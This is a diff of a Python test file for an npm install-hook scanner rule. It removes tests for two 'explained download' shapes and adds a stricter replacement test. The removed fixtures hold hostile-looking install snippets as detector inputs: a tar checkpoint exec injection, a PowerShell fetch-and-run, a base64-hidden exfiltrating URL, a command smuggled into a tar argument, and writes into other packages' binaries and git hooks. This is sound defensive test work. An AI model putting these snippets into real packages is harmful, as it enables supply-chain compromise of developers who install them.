@@ -1,4 +1,4 @@
-"""`npm.install-explained` (S1-S3) and `agent.hostile-instructions` on inert packages."""
+"""`npm.install-explained` (S1, S3, S5) and `agent.hostile-instructions` on inert packages."""
 
 import json
 from typing import Any
@@ -117,53 +117,6 @@ def test_s1_platform_binary_launcher() -> None:
     assert platform_builds("tool", {"optionalDependencies": ["tool-linux-x64"]}) == []
 
 
-def test_s2_own_release_download_with_a_checksum() -> None:
-    manifest = hook(repository=REPO)
-    assert shape(change({"install.js": DOWNLOADER}, manifest)) == "S2"
-    # Without the checksum, from another repository, or with another URL beside it: no.
-    unchecked = DOWNLOADER.replace(b'createHash("sha256")', b"x").replace(b"SHA256SUMS", b"")
-    assert shape(change({"install.js": unchecked}, manifest)) is None
-    other = hook(repository="https://github.com/someone/else")
-    assert shape(change({"install.js": DOWNLOADER}, other)) is None
-    extra = DOWNLOADER + b'\nhttps.get("https://paste.example.invalid/raw/x");\n'
-    assert shape(change({"install.js": extra}, manifest)) is None
-    assert shape(change({"install.js": DOWNLOADER}, hook())) is None  # no repository
-    # cargo-dist names its downloads in package.json.
-    dist = b'const https = require("https");\nhttps.get(pkg.artifactDownloadUrls[0]);\n'
-    dist += b"verifyChecksum(file);\n"
-    urls = ["https://github.com/kx-org/tool/releases/download/v1/tool.tgz"]
-    assert shape(change({"install.js": dist}, manifest | {"artifactDownloadUrls": urls})) == "S2"
-    assert shape(change({"install.js": dist}, manifest | {"artifactDownloadUrls": ["x"]})) is None
-    assert own_repo({"repository": {"url": 3}}) is None
-
-
-def test_s2_cargo_dist_downloads_need_no_checksum() -> None:
-    """v3 (round 4): cargo-dist's npm installer names its downloads in `package.json`
-    (`artifactDownloadUrls`) and checks no checksum. Every one being the package's own
-    releases is the shape; one elsewhere, or other URLs in the code, is not."""
-    manifest = hook(repository=REPO)
-    dist = (
-        b'const https = require("https");\n'
-        b"// e.g. https://example.com/binary/download.tar.gz\n"
-        b"https.get(pkg.artifactDownloadUrls[0]);\n"
-    )
-    urls = ["https://github.com/kx-org/tool/releases/download/v1/tool.tgz"]
-    found = RULE.evaluate_code(
-        change({"install.js": dist}, manifest | {"artifactDownloadUrls": urls})
-    )
-    assert [f.explanation.split(" ", 1)[0] for f in found] == ["S2"]
-    assert "artifactDownloadUrls" in found[0].explanation
-    elsewhere = [*urls, "https://cdn.example.invalid/tool.tgz"]
-    assert (
-        shape(change({"install.js": dist}, manifest | {"artifactDownloadUrls": elsewhere})) is None
-    )
-    other = dist + b'https.get("https://paste.example.invalid/raw/x");\n'
-    assert shape(change({"install.js": other}, manifest | {"artifactDownloadUrls": urls})) is None
-    # Without `artifactDownloadUrls` a download from the own releases still needs a checksum.
-    unchecked = DOWNLOADER.replace(b'createHash("sha256")', b"x").replace(b"SHA256SUMS", b"")
-    assert shape(change({"install.js": unchecked}, manifest)) is None
-
-
 FETCHER = b"""
 const https = require("https"), fs = require("fs"), path = require("path");
 const { execFileSync } = require("child_process");
@@ -179,111 +132,19 @@ https.get(url, (res) => {
 """
 
 
-def test_s6_own_binary_download_not_run() -> None:
-    """v4 (round 5): a download from the package's own releases (its repository's, or its
-    owner's other repositories'), unpacked by an archive tool and never run, needs no
-    checksum."""
+def test_no_download_is_an_explained_shape() -> None:
+    """v5 (round 6 R, the owner's strict ruling of 2026-11-10): S2 (own-release download with a
+    checksum, or cargo-dist's `artifactDownloadUrls`) and S6 (own-binary download not run) are
+    gone. A download of the package's own binary from its own releases is not explained;
+    `npm.install-download` reports it."""
     manifest = hook(repository=REPO)
-    found = RULE.evaluate_code(change({"install.js": FETCHER}, manifest))
-    assert [f.explanation.split(" ", 1)[0] for f in found] == ["S6"]
-    assert "kx-org" in found[0].explanation
-    # The owner's other repository (a separate releases repository), and shell unpacking.
-    org = FETCHER.replace(b"kx-org/tool/", b"kx-org/tool-releases/")
-    assert shape(change({"install.js": org}, manifest)) == "S6"
-    for unpack in (
-        b'execSync(`cd "${dir}" && unzip -o tool.zip 2>/dev/null`);',
-        b"execSync(`powershell -NoProfile -Command \"Expand-Archive -Force '${a}' '${d}'\"`);",
-        b'spawnSync("xattr", ["-d", "com.apple.quarantine", bin]);',
-        b'execFileSync("uname", ["-m"]); execSync("ldd --version");',
-    ):
-        code = FETCHER.replace(
-            b'const { execFileSync } = require("child_process");',
-            b'const { execFileSync, execSync, spawnSync } = require("child_process");',
-        )
-        assert shape(change({"install.js": code + unpack}, manifest)) == "S6", unpack
-    # Running what it downloaded (or anything else) keeps the findings.
-    for run in (
-        b'execFileSync(path.join(__dirname, "bin", "tool"), ["init"]);',
-        b'execFileSync(bin, ["--version"]);',
-        b'execFileSync("tar", ["-xf", f, "--checkpoint=1", "--checkpoint-action=exec=sh x"]);',
-        b'execFileSync("curl", ["-o", f, url]);',
-        b'execFileSync("powershell", ["-Command", "iex (irm x)"]);',
-        b"execFileSync(cmd, args);",
-        b'execFileSync("tar", ["-xf", "a; ./bin/tool init"], { shell: true });',
-        b'const run = execFileSync; run("tar", ["-xf", f]);',
-    ):
-        assert shape(change({"install.js": FETCHER + run}, manifest)) is None, run
-    shell = FETCHER.replace(b'execFileSync("tar", [', b"require('child_process').execSync(`tar ")
-    shell = shell.replace(
-        b'"-xzf", file, "-C", path.join(__dirname, "bin")]);', b"-xzf x && ./bin/tool`);"
-    )
-    assert shape(change({"install.js": shell}, manifest)) is None
-    # Another host, another owner, another version, a home directory, a package loaded by name,
-    # sending, or code run another way: no.
-    for extra in (
-        b'https.get("https://cdn.example.invalid/tool.tgz");',
-        b'https.get("https://github.com/someone/tool/releases/download/v1.0.1/x");',
-        b'https.get("https://github.com/kx-org/tool/releases/download/v0.9.0/x");',
-        b'fs.mkdirSync(require("os").homedir() + "/.kx");',
-        b'require("kx-downloader").fetch();',
-        b'https.request({ host: "github.com", method: "POST" });',
-        b'new (require("worker_threads").Worker)(file);',
-        b'require("./bin/tool.js");',  # a file it doesn't ship: maybe what it downloaded
-        b'https.get(atob("aHR0cHM6Ly94LmludmFsaWQv") + os.hostname());',  # a hidden URL
-        b'const u = Buffer.from(s, "base64").toString();',
-        # Writing it into another package, a system directory or the user's project.
-        b'fs.copyFileSync(f, path.join(root, "node_modules", "esbuild", "bin", "esbuild"));',
-        b'fs.copyFileSync(f, require.resolve("dep/bin/x"));',
-        b'fs.copyFileSync(f, "/usr/local/bin/tool");',
-        b'fs.copyFileSync(f, path.join(process.env.INIT_CWD, "tool"));',
-        b'fs.copyFileSync(f, path.join(root, ".git", "hooks", "pre-commit"));',
-        b'import("./vendor/run.mjs");',
-    ):
-        assert shape(change({"install.js": FETCHER + extra}, manifest)) is None, extra
-    # Shipped files and JSON data may be loaded.
-    lib = {"lib/util.js": b"module.exports = 1;"}
-    shipped = FETCHER + b'require("./lib/util"); require("./package.json");'
-    assert shape(change({"install.js": shipped} | lib, manifest)) == "S6"
-    # A literal version that is the package's is fine; so is a file of the owner's repositories
-    # that the code only names (an install hint), since nothing it fetches runs.
-    pinned = FETCHER + b'https.get("https://github.com/kx-org/tool/releases/download/v1.0.1/x");'
-    assert shape(change({"install.js": pinned}, manifest)) == "S6"
-    hint = (
-        FETCHER + b'console.log("or: curl https://raw.githubusercontent.com/kx-org/x/main/i.sh");'
-    )
-    assert shape(change({"install.js": hint}, manifest)) == "S6"
-    raw_only = b'require("https").get("https://raw.githubusercontent.com/kx-org/tool/main/x");'
-    assert shape(change({"install.js": raw_only}, manifest)) is None  # not a release download
-    # The hook must be plain `node <file>`: nothing chained that runs the binary.
-    chained = hook("node install.js && bin/tool init", repository=REPO)
-    assert shape(change({"install.js": FETCHER}, chained)) is None
-    inline = hook(
-        "node -e \"require('https').get('https://github.com/kx-org/tool/releases/download/x')\"",
-        repository=REPO,
-    )
-    assert shape(change({}, inline)) is None
-    # No repository, or no download of its own: no.
-    assert shape(change({"install.js": FETCHER}, hook())) is None
-    nothing = b'const https = require("https");\nhttps.get(process.argv[2]);\n'
-    assert shape(change({"install.js": nothing}, manifest)) is None
-    # The homepage's own host counts as the package's own; a code host's doesn't.
-    home = FETCHER.replace(
-        b"https://github.com/kx-org/tool/releases/download", b"https://dl.kx.dev"
-    )
-    assert shape(change({"install.js": home}, manifest | {"homepage": "https://kx.dev/"})) is None
-    site = manifest | {"homepage": "https://dl.kx.dev/docs"}
-    assert shape(change({"install.js": home}, site)) == "S6"
-    hub = manifest | {"homepage": "https://gitlab.com/kx-org/tool"}
-    gitlab = FETCHER.replace(
-        b"https://github.com/kx-org/tool/releases/download", b"https://gitlab.com/x"
-    )
-    assert shape(change({"install.js": gitlab}, hub)) is None
-    # Install code that isn't JavaScript, or uses child_process in a way that can't be read.
-    other = {"install.js": FETCHER, "install.sh": b"#!/bin/sh\n./bin/tool init\n"}
-    loader = FETCHER + b'execFileSync("sh", ["install.sh"]);'
-    assert shape(change(other | {"install.js": loader}, manifest)) is None
-    hidden = FETCHER + b'const cp = require("child_process"); later(cp);'
-    assert shape(change({"install.js": hidden}, manifest)) is None
+    assert shape(change({"install.js": DOWNLOADER}, manifest)) is None
+    assert shape(change({"install.js": FETCHER}, manifest)) is None
+    dist = b'const https = require("https");\nhttps.get(pkg.artifactDownloadUrls[0]);\n'
+    urls = ["https://github.com/kx-org/tool/releases/download/v1/tool.tgz"]
+    assert shape(change({"install.js": dist}, manifest | {"artifactDownloadUrls": urls})) is None
+    assert own_repo({"repository": {"url": 3}}) is None
+    assert own_repo(manifest) == ("kx-org", "tool")
 
 
 NOTICE = b"""
@@ -556,7 +417,7 @@ def test_an_added_hook_is_judged_like_a_new_package_for_s1_s3_s5_only() -> None:
     copier = {"scripts/copy.js": COPIER, "skills/kx/SKILL.md": SKILL}
     assert shape(change(copier, hook("node scripts/copy.js"), base={})) == "S3"
     manifest = hook(repository=REPO)
-    assert shape(change({"install.js": DOWNLOADER}, manifest)) == "S2"
+    assert shape(change({"install.js": DOWNLOADER}, manifest)) is None  # no S2 since v6
     assert shape(change({"install.js": DOWNLOADER}, manifest, base={})) is None
     platforms = hook(optionalDependencies=PLATFORMS)
     assert shape(change({"install.js": LAUNCHER_FETCH}, platforms, base={})) == "S1"
